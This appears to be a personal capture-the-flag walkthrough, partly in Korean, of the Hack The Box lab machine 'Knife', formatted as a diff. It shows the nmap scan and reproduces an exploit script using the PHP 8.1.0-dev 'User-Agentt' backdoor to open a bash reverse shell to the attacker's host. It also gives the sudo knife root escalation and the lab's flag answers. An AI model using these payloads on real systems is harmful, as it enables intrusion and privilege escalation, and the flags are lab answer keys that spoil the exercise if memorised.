@@ -1,0 +1,154 @@
+Machine: Knife
+TARGET: 10.129.11.28
+
+
+
+Task 1
+
+How many TCP ports are open on Knife?
+
+nmap -sV -sC -oA nmap/Knife $ip   
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title:  Emergent Medical Idea
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+> 2
+
+
+
+
+Task 2
+
+What version of PHP is running on the webserver?
+
+wappalyzer 분석
+Font scripts
+
+Google Font API
+Web servers
+
+Apache HTTP Server
+2.4.41
+Programming languages
+
+PHP
+8.1.0
+Operating systems
+
+Ubuntu
+CDN
+
+Cloudflare
+
+> 8.1.0-dev
+
+Task 3
+
+What HTTP request header can be added to get code execution in this version of PHP?
+
+https://www.juniper.net/us/en/threatlabs/ips-signatures/detail.HTTP:PHP:PHP-810-DEV-AGENTT-RCE.html
+
+HTTP: PHP 8.1.0-dev User-Agentt Header Remote Code Execution
+
+> Agentt
+
+Task 4
+
+What user is the web server running as?
+
+https://github.com/j4k0m/PHP-8.1.0-dev-RCE
+위 깃허브에서 exploit.sh 받아옴옴
+if [ $# != 3 ]
+then
+	printf "\033[0;31mUSAGE:\033[0m ./exploit.sh [HOST] [LHOST] [PORT]\n"
+else
+	TARGET=$1
+	LHOST=$2
+	PORT=$3
+	printf "\033[0;31mTarget:\033[0m $TARGET\n"
+	curl $TARGET -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -H "User-Agentt: zerodiumsystem(\"bash -c 'sh -i >& /dev/tcp/$LHOST/$PORT 0>&1'\");" > /dev/null
+	printf "Exploited <3\n"
+fi
+
+
+nc -nlvp 9999
+./exploit.sh 10.129.11.28 10.10.14.156 9999
+
+리버스셸 연결결
+
+id
+uid=1000(james) gid=1000(james) groups=1000(james)
+
+> james
+
+Submit User Flag
+
+Submit the flag located in the james user's home directory.
+
+cat /home/james/user.txt
+> 63ed48a287ee1f103e197e2e027cb4cf  
+
+
+Task 6
+
+What is the full path to the binary on this machine that james can run as root?
+
+
+
+sudo -l                                                                                                                           
+Matching Defaults entries for james on knife:                                                                                                        
+    env_reset, mail_badpass,                                                                                                                         
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                         
+                                                                                                                                                     
+User james may run the following commands on knife:                                                                                                  
+    (root) NOPASSWD: /usr/bin/knife    
+
+
+> /usr/bin/knife    
+
+Submit Root Flag
+
+Submit the flag located in root's home directory.
+
+https://gtfobins.github.io/gtfobins/knife/#sudo
+
+Sudo
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+sudo knife exec -E 'exec "/bin/sh"'
+루트권한 획득
+
+
+> 1888d3c38b467903dfa81d9ace919f9e
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
